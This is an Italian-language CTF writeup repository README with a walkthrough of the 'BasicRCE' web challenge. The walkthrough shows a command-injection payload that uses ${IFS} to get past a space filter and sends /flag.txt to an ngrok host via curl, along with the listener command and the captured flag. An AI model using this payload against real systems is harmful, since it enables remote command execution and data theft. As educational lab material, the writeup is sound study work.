# CTF Writeups & HTB Machines 💀

In questo repository archiviamo tutte le writeups di CTF (Capture The Flag) e macchine HTB (Hack The Box) che ho completato.

## Contenuti 📚
- **CTF Writeups**: Soluzioni dettagliate delle sfide CTF
- **HTB Machines**: Guide complete per le macchine Hack The Box

## Contributi 🤝
Per contribuire con un writeup, contattami via email: `luca.crippa05@gmail.com`

## Licenza ⚖️
Repository condivisa per scopi educativi. Rispetta sempre le policy delle piattaforme quando condividi materiale.

---

# Writeup: WS_1.01 - BasicRCE

## Overview
- **Categoria:** Web
- **Autore:** bonaff
- **Difficoltà:** 495
- **Stato:** Up (last checked: 11 minutes ago)
- **URL:** [http://basicrce.challs.cyberchallenge.it](http://basicrce.challs.cyberchallenge.it)

## Descrizione 📝
La challenge presenta una pagina web con un campo di input e un pulsante "Ping!". Il titolo stesso suggerisce la presenza di una vulnerabilità di **Remote Code Execution (RCE)**.

Il problema principale è che:
- **Non c'è output diretto**.
- **Non si possono usare spazi**.

L'obiettivo è trovare un modo per leggere il contenuto di `/flag.txt` e riceverlo su un server esterno.

## Soluzione 🎯

### 1. Identificazione della Vulnerabilità
Il campo di input accetta un valore che viene passato a un comando `ping`. Se non ci sono adeguate misure di sicurezza, è possibile concatenare altri comandi usando `;` o `&&`.

Dal titolo e dai test eseguiti, risulta che:
- Il comando viene eseguito direttamente nel sistema.
- Gli spazi non sono consentiti, ma possono essere aggirati con `${IFS}`.

### 2. Creazione del Payload
Poiché il server non restituisce output, dobbiamo inviare la flag a un server esterno usando `curl`.

Il payload finale è:
```sh
www.google.com;${IFS}curl${IFS}-X${IFS}GET${IFS}"https://60bf-94-32-176-238.ngrok-free.app?flag=$(cat${IFS}/flag.txt)"
```
**Spiegazione:**
- `www.google.com;` → esegue il comando `ping` su Google e poi continua con il nostro exploit.
- `${IFS}` → sostituisce gli spazi, aggirando il filtro.
- `curl -X GET "URL?flag=$(cat /flag.txt)"` → legge la flag e la invia al nostro server.

### 3. Ricezione della Flag
Su un server Ngrok, avviamo un listener per intercettare la richiesta:
```sh
python3 -m http.server 80
```
Quando il payload viene eseguito, riceviamo la risposta con la flag:
```
127.0.0.1 - - [20/Feb/2025 03:55:51] "GET /?flag=CCITP1ng_P0ng_s3micol0n_g3t_fl4g HTTP/1.1" 200 -
```

## Flag 🏁
```
CCIT{P1ng_P0ng_s3micol0n_g3t_fl4g}
```

## Lezioni Apprese 📚
- **Remote Code Execution (RCE)**: L'inserimento di comandi non sanitizzati permette l'esecuzione arbitraria sul server.
- **Evitare il filtro sugli spazi**: `${IFS}` è un metodo efficace per aggirare il blocco degli spazi.
- **Esfiltrazione dei dati**: Se l'output è bloccato, è possibile usare `curl` per inviare le informazioni a un server esterno.

## Tools Utilizzati 🛠️
- **Burp Suite**: Per testare le iniezioni.
- **Ngrok**: Per ricevere la flag.
- **Python HTTP Server**: Per catturare le richieste.

---

*Writeup by Luca Crippa - Last Updated: 2024*
